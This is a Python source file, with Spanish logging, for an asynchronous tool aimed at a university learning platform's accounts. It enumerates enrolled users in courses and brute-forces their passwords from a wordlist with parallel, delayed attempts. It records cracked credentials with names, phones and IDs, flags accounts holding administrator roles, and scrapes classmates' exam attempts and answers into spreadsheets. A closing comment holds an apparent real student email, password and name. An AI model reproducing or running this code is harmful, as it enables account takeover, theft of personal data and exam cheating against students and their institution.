

# from MySQLdb import Connect
from __future__ import division
from ctypes.wintypes import INT
from hashlib import new
from multiprocessing.connection import Client
from nis import cat
from shutil import ExecError
import string
from time import sleep, time
from typing import List
from aiohttp import ClientConnectionError, ClientProxyConnectionError
from aiohttp_socks import ProxyError, ProxyTimeoutError
from aiosocks import SocksError
from blessed import Terminal
from graphene import Int
from grpc import Call
from inquirer import password
from jsonschema import FormatChecker
from numpy import mat
from phonenumbers import format_out_of_country_calling_number
from platformdirs import user_runtime_dir
from requests import session
from rx import catch
from sqlalchemy import false, true
from stem import SocketError
import xlwt
import random

from logging import Logger
import logging
import openpyxl
import aiofiles
from Utils import Status
from menu import MenuTerminal
from Formaterloggin import CustomFormatterPrinc
import asyncio
from conn import Connect

import math
class Asincrone(object):
    ch = logging.StreamHandler()
    ch.setFormatter(CustomFormatterPrinc(datefmt='%H:%M:%S', color=True))

    def __init__(
            self,
            TArgs,
            idcurses: List = None,
            CallConnect=None,
            idsubitem=None,
            logger: Logger = None):
        # def
        # __init__(self,idcurses:List=None,idsubitem=None,logger:Logger=None):
        self.TArgs=TArgs
        self.logger = logger
        self.idcurses = idcurses
        self.idsubitem = idsubitem
        self.loggerApp = logging.getLogger('APPAsincrone')
        self.loggerApp.addHandler(self.ch)
        self.loggerApp.setLevel(self.TArgs.verbosity)
        # self.NodePrevius=NodePrevius
        self.CallUserConect = CallConnect
        self.MenuTerminal = None
        self.Session = []

    async def FormatCurses(self, AllCurses):
        curses = []
        for usuarioperteneciente, x in enumerate(AllCurses):
            for f, y in enumerate(x["results"]):
                users=[usuarioperteneciente]
                res = list(filter(lambda s: s[1][0] == str(
                    y["courseId"]), enumerate(curses)))
                if(len(res) == 1):
                    curses[res[0][0]][-1] += 1
                    curses[res[0][0]][3] += y["course"].get("isClosed")
                    curses[res[0][0]][4].append(usuarioperteneciente)
                else:
                    curses.append([str(y["courseId"]), str(y["course"].get("courseId")), y["course"].get(
                        "displayName"), y["course"].get("isClosed"), users, f, 1])
        return curses
    
    async def getIDCurses(self):
        AllCurses = await asyncio.gather(*[x.extractCurses() for x in self.Session])
        curses = await self.FormatCurses(AllCurses)
        return list(filter(lambda s: s[0] in self.idcurses, curses))

    async def getSubItemCurse(self, session: list, idcurse):
        if(self.idsubitem is None):
            L1 = await asyncio.gather(*[x.GetContentCurse(idcurse) for x in session])
            if(len(session) == 1):
                ExampleItem = (await self.MenuTerminal.SelectItem(L1))["id"]
            return ExampleItem
        return self.idsubitem

    async def getSubItemItemCurse(self, session: list, idcurse, item):
        L2 = await asyncio.gather(*[x.selectItemCurseAction(idcurse, item) for x in self.Session])
        if(len(session) == 1):
            for x in L2[0]["results"]:
                if(list(x["contentDetail"].keys())[0] == 'resource/x-bb-asmt-test-link'):
                    return x["id"]

            ExampleItem = (await self.MenuTerminal.SelectItemSubItem(L2))["id"]
            return ExampleItem
        return None

    async def findendUserFunc(self, file, dict, tab):

        for key, value in dict.items():
            await file.write(("\t" * tab) + key + "   :   ")

            if(key == "editSystemRoles" and value):
                self.logger.warning(
                    "Se encontro un PEZ GORDO! " + "[ROOT ENABLE]")
            elif(key == "editInstitutionRoles" and value):
                self.logger.warning(
                    "Se encontro un PEZ Demaciado GORDO!! [SUPER ROOT ENABLE]")

            if(isinstance(value, dict.__class__)):
                await self.findendUserFunc(file, value, tab + 1)
            else:
                await file.write(("\t" * (tab + 1)) + str(value) + "\n")

    async def creatUserMany(self, dels):
        self.loggerApp.info("Guardando Datos...")
        s = dels.get
        def func(x): return "" if(s(x, {}) == {}) else s(x)
        async with aiofiles.open("UsersRecolect.XD", mode="a") as ficher:
            await self.findendUserFunc(ficher, dels, 0)
            self.loggerApp.info(
                "[OK] {} [{} {}] {}-{} {}->{} ".format(
                    func("emailAddress"),
                    func("givenName"),
                    func("familyName"),
                    func("state"),
                    func("country"),
                    func("mobilePhone"),
                    func("id")))
    async def UserInList(self,list,user)->bool:
        for x in list:
            if(x["userId"]==user):
                return True
        return False
    async def ConcatenateUsersSimilary(self,AllUsers:list)->list:
        results=[]
        for x in AllUsers:
            for z in x:
                for j in z["body"].get("results"):
                    if(not(await self.UserInList(results,j["userId"]))):
                        results.append(j)
        return results
                
    async def mainUsersMany(self, users):
        # ./
        await self.ConnectUsers(users)
        await self.ComprobateUsers()  # ./
        if(len(self.Session) == 0):
            # CurseID,CurseSelectUser=await self.getIDCurse(self.Session)
            self.loggerApp.info(
                "No existen cuentas a las que se pueda acceder")
            return None

        while True:
            self.MenuTerminal = MenuTerminal(NodePrev=self)
            if(self.idcurses is None):
                self.loggerApp.info("Obteniendo los cursos de cada usuario")
                AllCursesForUser = await self.InitSelectToCurse()
                self.loggerApp.info("Formateando cursos para ser implementados")
                formatCurse= await self.FormatCurses(AllCursesForUser)
                self.loggerApp.info("Selecionando Cursos desde la terminal")
                SelectCurse = (await self.MenuTerminal.SelectCurse(formatCurse))
                
            else:
                SelectCurse = await self.getIDCurses()

            if(SelectCurse == []):
                self.loggerApp.error("No existen estos cursos...")
                break
            else:
                CurseAction = 1 if(self.TArgs.extratcurseoperation) else await self.MenuTerminal.SelectTerminalCurse()
                
                if(CurseAction == 0):
                    
                    idcurse = SelectCurse[0][0]
                    ExamInSubCurse = await self.SearchExamInSubCurse(await self.ExtractSubCurses(SelectCurse[0][0]))
                    ExamAllUsers = await self.getIntentsExamsAllUsers(await self.GetExamInSubCurse(ExamInSubCurse[0]["id"], idcurse), ExamInSubCurse[0]["id"], idcurse)
                    await self.SaveExamenesExel(await self.AnaliticExamAllUsers(ExamAllUsers))
                else:
                    #Esto obtiene el curso del usuario que se le envia como 2 parametro
                    
                    # UsersInCurse = asyncio.gather(*[self.ExtractUserToCursers(SelectCurse[0][0],x) for x in SelectCurse[0][4]])
                    self.loggerApp.info("Extranedo Cursos de cada uno de los datos XDD")
                    if(self.TArgs.fileuseranalitic==None):
                        GenerateUserInCurse=await asyncio.gather( *[asyncio.gather(*[self.ExtractUserToCursers(Curse[0],x) for x in Curse[4]]) for Curse in SelectCurse ])
                        UsersInCurse=[]
                        [[UsersInCurse.append(s) for s in x] for x in GenerateUserInCurse]
                        AllUsersForCurser=await self.ConcatenateUsersSimilary(UsersInCurse)
                        
                        if(self.TArgs.passwordHaking is None and self.TArgs.archivePwd is None):
                            FinalUsersFormat = await self.MenuTerminal.InsertPwdUser(AllUsersForCurser, SelectCurse[0][4])
                        else:
                            NewUsersFormat = []
                            passwords=[]
                            if(self.TArgs.archivePwd!=None):
                                self.loggerApp.info("Abriendo archivo de conexion")
                                with self.TArgs.archivePwd as archive:
                                    for x in archive.read().splitlines():
                                        passwords.append(x) 
                            else:
                                passwords.append(self.TArgs.passwordHaking)
                            # for x in AllUsersForCurser[0]["body"].get("results"):
                            self.loggerApp.info("Rellenado contraseñaas XDD")
                            for x in AllUsersForCurser:
                                user = x["user"]
                                NewUsersFormat.append(
                                    [
                                        user["userName"],
                                        passwords.copy(),
                                        user["givenName"] +
                                        " " +
                                        user["familyName"],
                                        user["avatar"]["permanentUrl"]])
                            
                            self.loggerApp.info("Notificando Datos")
                        
                            excludecurses = await self.searchfileincurse()
                            FinalUsersFormat=await self.filterExludeuser(NewUsersFormat,excludecurses,passwords.copy())
                    else:
                        FinalUsersFormat=[]
                        if(self.TArgs.fileuseranalitic!=None):
                            self.logger.info("Cargando.. Datos")
                            with open(self.TArgs.fileuseranalitic,"r") as papu:
                                for x in papu.read().splitlines():
                                    dato = x.split("|")
                                    FinalUsersFormat.append([dato[0],dato[1].split(",")])
                                    
                            
                    
                    # await self.InitiNewUsers(NewUsersFormat, SelectCurse[0][4])
                    self.loggerApp.info("HAKENADO...")
                    # await self.MenuTerminal.PrintUsers(AllUsersForCurser)
                    
                    # await self.MenuTerminal.PrintUsersFormated(FinalUsersFormat[2920:])
                    
                    
                    #Si decea imprimir
                    await self.MenuTerminal.PrintUsersFormated(FinalUsersFormat)
                    
                    #Guardando datos filtrados
                    if(self.TArgs.filesaveanaliticextractuser!=None):
                        self.logger.info("GUARDANDO DATOS...")
                        with open(self.TArgs.filesaveanaliticextractuser,"a") as papu:
                            for x in FinalUsersFormat:
                                if(len(x)>1):
                                    if(len(x[1])>1):
                                        string="{}|{}\n".format(x[0],",".join(x[1]))
                                        papu.write(string)
                    
                    # await self.InitiNewUsers(FinalUsersFormat[2920:])
                    await self.InitiNewUsers(FinalUsersFormat)
                    
    async def filterExludeuser(self,users:list,excludeusers,passwords):
        for x in enumerate(users.copy()):
            for y in excludeusers["Buenos"]:
                if(y[0]==x[0]):
                    self.logger.info("Elimiando Ya registrado!! {}".format(users.remove(x)))
                    
        reformed=users.copy()
        for j in excludeusers["Malos"]:
            for s,x in enumerate(reformed):
                if(j[0]==x[0]):
                    for k in enumerate(x[1]):
                        if(k in j[1]):
                            users[s][1].remove(k)    
                else:
                    resp=passwords.copy()
                    for l in enumerate(passwords):
                        if(l in j[1]):
                            resp.remove(l)
                    if(len(resp)==0):
                        self.loggerApp.info("Se removieron todas las contraseñas del usuario {} GG".format(j[0]))
                    else:
                        j[1]=resp
                        users.append(j)
                        break
        return users

            
    async def searchfileincurse(self):
        excludecurses={"Buenos":[],"Malos":[]}
        if(self.TArgs.fileexludehaking!=None):
            with open(self.TArgs.fileexludehaking,"r") as fileexclude:
                for x in fileexclude.read().splitlines():
                    if(x[0]!=":" and x[0]!="#"):
                        if(x[0]=="~"):
                            dato=x[1:].split("|")[:3]
                            dato[1]=dato[1].split(",")
                            excludecurses["Malos"].append(dato)
                        else:
                            dato=x[1:].split("|")[:3]
                            dato[1]=dato[1].split(",")
                            excludecurses["Buenos"].append(dato)
        return excludecurses
        
                        
                        


    async def mainHakingUserBruteforce(self, users, limitTimePassword=0.2, limitTimeChangeUser=0.1, limitTimeUserProcess=15):
        self.loggerApp.info(
            "Selecionando los usuarios para la recoleccion de datos ")
        await self.ConnectUsers(users, limitTimePassword, limitTimeChangeUser, limitTimeUserProcess)
        if(len(self.Session) == 0):
            # CurseID,CurseSelectUser=await self.getIDCurse(self.Session)
            self.loggerApp.warning(
                "No existen cuentas a las que se pueda acceder")
            return None

        SelectCurseAll = await self.InitSelectToCurse()

        if(SelectCurseAll == []):
            self.loggerApp.error("No existen estos cursos...")
            return false

        await self.SaveUsersOpen(self, SelectCurseAll)

    async def OpenConnectUserHakign(self, usuario: Connect,recursive=0):
        
        try:
            await asyncio.sleep(recursive*2)
            await self.ProcessConnect(usuario)
            await self.ComprobateUser(usuario)
            
            # if(usuario.status==Status.Iniciado):
            #     cursos = await self.InitUserSelectToCurse(usuario)
            # else:
            #     cursos=None
        except Exception as res:
            self.logger.info("Hay un error de conexion Cliente"+str(recursive))
            await usuario.session.close()
            return await self.OpenConnectUserHakign(Connect(usuario.gmail, usuario.password , usuario.username, usuario.logger),recursive+2)
        return usuario
       
            
    async def TuneProccesHaking(self,Users,time=0):
        self.logger.debug("[Retrofit Al extremo!! XDD]")
        await asyncio.sleep(time)
        #Users=([1,3],[2,4])
        for x in Users:
            user=await self.OpenConnectUserHakign(x)
            if user.status==Status.Iniciado:
                cursos = await self.InitUserSelectToCurse(user)
                return [user,cursos]
            await user[0].session.close()
        return [None,None]
    
    async def OneProcessHaking(self, user: Connect):
        self.logger.info("COnectando Usuario")
        if(self.TArgs.asyncPasswords):
            self.logger.info("Hakenado password por Hilos")
            newusers=[[] for _ in range(self.TArgs.asynclimitproccespassword)]
            for y,x in enumerate(user[1]):
                
                self.logger.debug("Hakenado Hilo User:[{}] ({})".format(user[0],y))
                newusers[y%self.TArgs.asynclimitproccespassword].append(Connect(user[0], x , user[2], self.logger))
            #newusers=[[1,3],[2,4]]
            coro=[self.TuneProccesHaking(x,self.TArgs.asyncTimepassworduser*y) for y,x in enumerate(newusers,1)]
            while coro:
                finished, unfinished = await asyncio.wait(coro,return_when=asyncio.FIRST_COMPLETED)
                for x in finished:
                    result = x.result()
                    if(result[0]!=None):
                        for y in unfinished:
                            y.cancel()
                        return result
                coro=unfinished
            return [None,None]
        else:
            newusers=[]
            for y,pwd in enumerate(user[1]):
                newusers.append(Connect(user[0], pwd , user[2], self.logger))
            return await self.TuneProccesHaking(newusers)
        

            
    async def mainHakingUserExtraBruteForce(self,users):
        self.logger.info("ELiminado ya conectandos")
        for x in enumerate(users.copy()):
            for j in self.Session:
                if(j.gmail==x[0]):
                    self.logger.info("Se removio del Bruteforce: "+str(x[0]))
                    users.remove(x)
                    break
                
        self.logger.info("Haking BruteForce")
        
        if(users!=[]):
            self.logger.info("Existen Usuarios")
            newusers=[[] for _ in range(self.TArgs.limitUserProcess)]
            for y,x in enumerate(users):
                newusers[y%self.TArgs.limitUserProcess].append(x)
            self.loggerApp.info("Usuarios una vez eliminados")
            self.loggerApp.debug(len(users))
            
            async with aiofiles.open(self.TArgs.filehakingsave,"a") as ficher:
                await asyncio.gather(*[self.generateUsers(x,(random.random()+self.TArgs.timeUserPassword),(random.randint(0,2)+self.TArgs.timeUserChange)*y,ficher=ficher) for y,x in enumerate(newusers) ])
            
        else:
            self.logger.error("No existen Usuarios en este Curso XDD")
            
    async def generateUsers(self,usuarios,timepwd,time,ficher):
        await asyncio.sleep(time)
        for y,x in enumerate(usuarios):
            await asyncio.sleep(timepwd*random.randint(0,y))
            RetornUser = await self.OneProcessHaking(x)
            
            if(RetornUser[0]!=None):
                await RetornUser[0].session.close()
            await self.SaveUserOpen( RetornUser[0], RetornUser[1] ,x,ficher)
            del RetornUser
            
    async def SaveUsersOpen(self, SelectCurseAll,ficher):
        curseItinerate = 0
        for new in self.Session:
            self.loggerApp.info("Guardando Datos...")
            stringer = "\n"
            if(new is not None):
                s = new.userDetalles.get
                def func(x): return "~" if(s(x, {}) == {}) else s(x)
                stringer += "{}|{}|{}|{}|{}|{}|{}".format(
                    func("emailAddress"),
                    new.password,
                    func("givenName") + " " + func("familyName"),
                    func("state"), func("country"),
                    func("mobilePhone"),
                    func("id"))

                UserCurse = ""
                if(SelectCurseAll is not None):
                    for x in SelectCurseAll[curseItinerate]["results"]:
                        UserCurse += "|Fecha de Inscripccion:{}|Id de curso:{}|ID de usuario: {}|Ultimo acceso:{}|Display id:{}|UUID:{}|Fecha de inicio:{}|Fecha de vencimiento total:{}|Fecha de creacion :{}|Ultima de fecha de modificacion: {}".format(
                            x.get("enrollmentDate"),
                            x.get("courseId"),
                            x.get("userId"),
                            x.get("lastAccessDate"),
                            x.get("course").get("displayId"),
                            x.get("course").get("uuid"),
                            x.get("course").get("startDate"),
                            x.get("course").get("endDate"),
                            x.get("course").get("createdDate"),
                            x.get("modifiedDate"))
                        UserCurse += "|Nombre:{}|Nombre Tecnico:{}|Url Externo:{}|ID de la RAMA:{}|Cerrado: {}".format(
                            x.get("course").get("displayName"),
                            x.get("course").get("term").get("name"),
                            x.get("course").get("externalAccessUrl"),
                            x.get("course").get("batchUid"),
                            x.get("course").get("isClosed"))
                        stringer += UserCurse

                if(new.userDetalles.get("editSystemRoles")):
                    stringer += "[ROOT]"
                elif(new.userDetalles.get("editInstitutionRoles")):
                    stringer += "[ROOT SUPER]"
                else:
                    stringer += "[USER]"
                curseItinerate += 1

            else:
                stringer += "~{}|{}".format(s.gmail, s.password)
            await ficher.write(stringer)

    async def SaveUserOpen(self, users: Connect, CursesUser,ficher):
        self.loggerApp.info("Guardando Datos... en {}".format(self.TArgs.filehakingsave))
        stringer = "\n"
        if(users!=None):
            s = users.userDetalles.get
            def func(x): return "~" if(s(x, {}) == {}) else s(x)
            stringer += "{}|{}|{}|{}|{}|{}|{}".format(
                users.gmail,
                users.password,
                func("givenName") + " " + func("familyName"),
                func("state"), func("country"),
                func("mobilePhone"),
                func("id"))

            UserCurse = ""
            if(CursesUser != None):
                for x in CursesUser["results"]:
                    
                    UserCurse += "|Nombre:{}|Nombre Tecnico:{}|Url Externo:{}|ID de la RAMA:{}|Cerrado: {}".format(
                        x.get("course",{}).get("displayName","~Sin nombre"),
                        x.get("course",{}).get("term",{}).get("name","~Sin Nombre tecnico"),
                        x.get("course",{}).get("externalAccessUrl","~Sin Url Externo"),
                        x.get("course",{}).get("batchUid","~Sin uid"),
                        x.get("course",{}).get("isClosed","~No se sabe"))
                    
                    UserCurse += "|Fecha de Inscripccion:{}|Id de curso:{}|ID de usuario: {}|Ultimo acceso:{}|Display id:{}|UUID:{}|Fecha de inicio:{}|Fecha de vencimiento total:{}|Fecha de creacion :{}|Ultima de fecha de modificacion: {}".format(
                        x.get("enrollmentDate","~No date"),
                        x.get("courseId","~Sin ID"),
                        x.get("userId","~Sin ID de usuario"),
                        x.get("lastAccessDate","~Sin ultimo acceso"),
                        x.get("course",{}).get("displayId","~No hay id"),
                        x.get("course",{}).get("uuid","~Sin uuid"),
                        x.get("course",{}).get("startDate","~Sin fecha de inico"),
                        x.get("course",{}).get("endDate","~Sin terminacion"),
                        x.get("course",{}).get("createdDate","~Sin creaccion"),
                        x.get("modifiedDate","~Sin fecha de modificacion"))
                    
                    stringer += UserCurse

            if(users.userDetalles.get("editSystemRoles")):
                stringer += "[ROOT]"
            elif(users.userDetalles.get("editInstitutionRoles")):
                stringer += "[ROOT SUPER]"
            else:
                stringer += "[USER]"
        else:
            stringer += "~{}|{}|{}".format(userLast[0],",".join(userLast[1]),userLast[2] )
        await ficher.write(stringer)

    async def ProcessConnect(self, x: Connect):
        await x.connection()
        await x.initsessionPrevius()
        await x.initRootSession()
        self.logger.info("Obteniendo Detalles")
        while True:
            try:
                await x.UserDell()
                break
            except TimeoutError:
                continue
            

    async def ConnectUsers(self, users, limitTimePassword=0.0, limitTimeChangeUser=0.0):
        self.loggerApp.info("Iniciando las conecciones")
        CallUser = self.CallUserConect.gmail if(
            self.CallUserConect is not None) else self.CallUserConect
        for exies in users:
            if(CallUser != exies[0]):
                self.loggerApp.info("Almacenando Contraseñas")
                for x in exies[1]:
                    self.Session.append(Connect(exies[0],x, exies[2], self.logger))

        # self.loggerApp.info("Recorreindo conexion")
        # await asyncio.gather(*[  x.connection()  for x in self.Session])
        # self.loggerApp.info("Recorriendo Pre inicio de session")
        # await asyncio.gather(*[x.initsessionPrevius() for x in self.Session])
        self.loggerApp.info("Iniciando Session Real")
        
        # if(limitTimeUserProcess is None):
        await asyncio.gather(*[self.ProcessConnect(x) for x in self.Session])
        # else:
            # len(self.Session) / limitTimeUserProcess
            
        self.loggerApp.info("Agregando cuenta aterior")
        if(self.CallUserConect is not None):
            self.Session.append(self.CallUserConect)

 

    async def ComprobateUsers(self):
        self.loggerApp.info("Comprabando inicio de cuentas...")
        for x, y in enumerate(self.Session.copy()):

            # self.loggerApp.debug("Verificando... {} {} ".format(self.Session[x].gmail,( "[ERROR]" if (y==None)  else " [OK]") ))
            if(y is None):
                self.Session[x].logger.error(
                    "{} [{}] Cuenta removida ... {}".format(
                        y.gmail, y.username, y.password))
                await self.Session[self.Session.index(y)].session.close()
                self.Session.remove(y)
            else:
                await self.creatUserMany(y.userDetalles)
        return self.Session

    async def ComprobateUser(self, user:Connect):
        if(user.status==Status.Iniciado):
            self.logger.info("Comprobando cuenta " + user.username)
            self.logger.debug("Registrando Cuenta " + user.gmail)
            await self.creatUserMany(user.userDetalles)
            return true
        else:
            user.session.close()
            user.status=Status.Bloqueado
            return false
            

    async def InitSelectToCurse(self):
        self.loggerApp.info("Iniciando Selecion de cursos")
        return await asyncio.gather(*[x.extractCurses() for x in list(filter(lambda x:x is not None, self.Session))])

    async def InitUserSelectToCurse(self, user: Connect):
        assert user.status == Status.Iniciado
        sleep=0
        while True:
            asyncio.sleep(sleep)
            try:
                return await user.extractCurses()
            except (ProxyError,TimeoutError,ConnectionError,ProcessLookupError,ProxyTimeoutError,SocketError,SocksError):
                sleep+=1
                continue
            
    # async def FormatCurses(self,AllCurses):
    #     curses=await self.FormatCurses(AllCurses)
        # return await self.getIDCurse(self.Session)
        # return CurseID,CurseSelectUser

    async def ExtractUserToCursers(self, CurseID, CurseSelectUser):
        await asyncio.sleep(0.5)
        self.logger.debug("Selecionado todos los usuarios de los cursos...")
        AllUsersCurse = await self.Session[CurseSelectUser].extractUserCurse(CurseID)
        self.logger.info("Retornando...{}".format(CurseID)) 
        return AllUsersCurse

    async def InitiNewUsers(self, AllUsersCurse):
        if(self.TArgs.passwordHaking==None and self.TArgs.archivePwd==None):
            # await Asincrone(logger=self.logger, CallConnect=self.Session[CurseSelectUser]).mainUsersMany(AllUsersCurse)
            self.mainUsersMany(AllUsersCurse)
        else:
            await self.mainHakingUserExtraBruteForce(AllUsersCurse)

    async def ExtractSubCurses(self, CurseID):
        # if(CurseAction==1):
        self.logger.info("Extraendo Sub Cursos... {}".format(CurseID))

        SubItemCurse = await self.getSubItemCurse([self.Session[0]], CurseID)
        SubItemItemCurse = await self.getSubItemItemCurse([self.Session[0]], CurseID, SubItemCurse)
        self.logger.debug("Los subcursos son los siguientes [{},{},{}]".format(
            CurseID, SubItemCurse, SubItemItemCurse))
        L3 = await asyncio.gather(*[x.selectItemCurseActionItem(CurseID, SubItemItemCurse) for x in self.Session])
        return L3

    async def SearchExamInSubCurse(self, L3):

        self.loggerApp.info("Buscando examen dentro del subcurso...")
        if("resource/x-bb-asmt-test-link" not in L3[0]["contentDetail"].keys()):
            self.loggerApp.warning(
                "No existe un examen accesible en este subcurso")
            self.loggerApp.info(
                "Detalles de contenido del curso de detalles \n {}".format(
                    L3[0]["contentDetail"]))

        ExamenExampleItem = L3[0]["contentDetail"]["resource/x-bb-asmt-test-link"]["test"]["gradingColumn"]
        if("@id" not in ExamenExampleItem.keys()):
            self.loggerApp.warning("Examen suspendido o no accesible...")
            self.loggerApp.info("Detalles del examen...  \n {}".format(L3[0]))

        ExamenExampleItem = ExamenExampleItem["@id"]
        L4 = await asyncio.gather(*[x.detCurseSelectItem(ExamenExampleItem) for x in self.Session])
        self.loggerApp.info("Examen Selecionado!")
        return L4

    async def GetExamInSubCurse(self, ExamelIDcolum, CurseID):

        L5 = await asyncio.gather(*[x.getExamenGeneral(CurseID, ExamelIDcolum) for x in self.Session])

        self.loggerApp.warning(self.Session)

        for s, y in list(enumerate(L5.copy()))[::-1]:
            self.loggerApp.debug(
                "Analizando... {} {} ".format(
                    self.Session[s].gmail, ("[ERROR]" if (
                        y is None) else " [OK]")))
            if(y is None):
                self.loggerApp.warning("Cuenta removida Cerrando...")
                await self.Session[self.Session.index(y)].session.close()
                self.Session.remove(y)
        if(not L5):
            self.loggerApp.critical("Cuentas sin detalles.. saliendo")
            return None
        return L5

    async def getIntentsExamsAllUsers(self, L5, ExamelIDcolum, CurseID):
        self.loggerApp.info("Obteniendo detalles de cada examen...")
        L6 = await asyncio.gather(*[x.getAllIntentsExamDell(CurseID, ExamelIDcolum, y["results"][0]["id"]) for y, x in list(zip([z for z in L5 if(z is not None)], self.Session))])
        return L6

    async def AnaliticExamAllUsers(self, L6):
        usuarios = []
        # Este for analiza todos los usuarios
        for p, a in enumerate(L6):
            # Este for analisa los resultados de los usuarios pueden ser mas de
            # 3
            Resultados = []
            for b in a.ExamDell["results"]:
                self.loggerApp.info(
                    "Analizando Usuario {}".format(b["userId"]))
                titel = b["toolAttemptDetail"]["resource/x-bb-assessment"]["assessment"]["title"]
                pspoints = b["toolAttemptDetail"]["resource/x-bb-assessment"]["possiblePoints"]
                points = b["toolAttemptDetail"]["resource/x-bb-assessment"].get(
                    "points")
                self.logger.info("Detalles del Examen")
                self.logger.info(
                    "Titulo {} Posibles Respuestas {} Puntos En total {}".format(
                        titel, pspoints, points))
                # Este for analisa Las preguntas de cada cuestionario
                Preguntas = []
                Alternativas = []
                detalles = []
                # ordenados= sorted(a,key=lambda ques:ques["questionId"])
                for c in sorted(
                    b["toolAttemptDetail"]["resource/x-bb-assessment"].get("questionAttempts"),
                        key=lambda ques: ques["questionId"]):
                    if(c["questionType"] != "presentation"):
                        # Este for muestra las respuestas de los cuestionarios
                        self.logger.debug(
                            "Pregunta: {} Puntos:{} ID del cuestionario {} (Estado: [{}]) | User Marc {}".format(
                                c["question"]["questionText"]["rawText"],
                                c["question"]["points"],
                                c["id"],
                                c["attemptStatus"],
                                c["givenAnswer"]))
                        self.logger.debug(
                            "ID del cuestionario {} Stado del cuestionario {}".format(
                                c["questionId"], c["attemptStatus"]))

                        # Este for representa la pregunta que tiene cada
                        # cuestionario
                        Preguntas.append(
                            c["question"]["questionText"]["rawText"])
                        Alternativas.append("")
                        detalles.append("Posicion de pregunta" +
                                        str(c["question"]["position"] -
                                            1) +
                                        "|" +
                                        "Los puntos que da son:" +
                                        str(c["question"]["points"]) +
                                        "|" +
                                        ("La respuesta es visible" if(c["isScoreVisible"]) else "No es visible"))
                        # for e,d in
                        # enumerate(sorted(c["question"]["answers"],key=lambda
                        # ques:ques["answerText"]["rawText"])):
                        for e, d in enumerate(sorted(list(zip(
                                c["question"]["answers"], c["givenAnswer"])), key=lambda ques: ques[0]["answerText"]["rawText"])):
                            self.logger.info(
                                "  Respuestas [{}] {} | ID {}".format(
                                    e, d[0]["answerText"]["rawText"], d[0]["id"]))
                            # Preguntas.append(d["answerText"]["rawText"])
                            # Preguntas.append(str(c["givenAnswer"][e]))
                            Preguntas.append(d[1])
                            Alternativas.append(
                                str(d[0]["answerText"]["rawText"]))
                            detalles.append("")

                puntosobtenidos = b["toolAttemptDetail"]["resource/x-bb-assessment"]["points"]
                puntosposibles = b["toolAttemptDetail"]["resource/x-bb-assessment"]["possiblePoints"]
                estado1 = b["toolAttemptDetail"]["resource/x-bb-assessment"]["status"]
                LimiteTiempo = b["toolAttemptDetail"]["resource/x-bb-assessment"]["timeLimitSeconds"]
                IDuser = b["userId"]
                estado2 = b["status"]
                fecha_inicio = b["attemptLastGradedDate"]
                Resultados.append([Preguntas,
                                   Alternativas,
                                   detalles,
                                   [puntosobtenidos,
                                    puntosposibles,
                                    estado1,
                                    LimiteTiempo,
                                    IDuser,
                                    estado2,
                                    fecha_inicio]])

            usuarios.append([[L6[p].username, L6[p].gmail], Resultados])
        return usuarios

    async def SaveExamenesExel(self, users):
        book = xlwt.Workbook(encoding="utf-8", style_compression=0)
        sheet = book.add_sheet('Final', cell_overwrite_ok=True)

        conteover = 0
        for a in users:
            conteohorizontal = 0
            for d, c in enumerate(a[0], 0):
                sheet.write(d, conteover, c)
            conteohorizontal += d
            for f, ger in enumerate(a[1], 1):
                for k, j in enumerate(ger):
                    for l, h in enumerate(j, 1):
                        sheet.write(l + conteohorizontal, (conteover) + k, h)
                conteohorizontal += len(ger[0])
            conteover += 5

        # self.logger.info(wb.sheetnames)
        self.loggerApp.info("Finalizando")
        book.save(input("Seleccione para guardar "))
        # wb.save(input("Inserte el nombre de sus archivo que guardara los datos"))

        # [[print(x["attemptReceipt"]) for x in s["results"]] for s in L6 ]
        # if(input("")):
        # raise ExecError
        # hoja=wb['Analisis1']
    def insertdatos(self, book, datos):
        pass


# AsincroneSession=Asincrone()
# loop = asyncio.get_event_loop()
# loop.run_until_complete(AsincroneSession.mainUsersMany([['1255664@senati.pe', 'Virtual19', 'AGUIRRE ORTIZ, CRISTHIAN JHAROL']]))
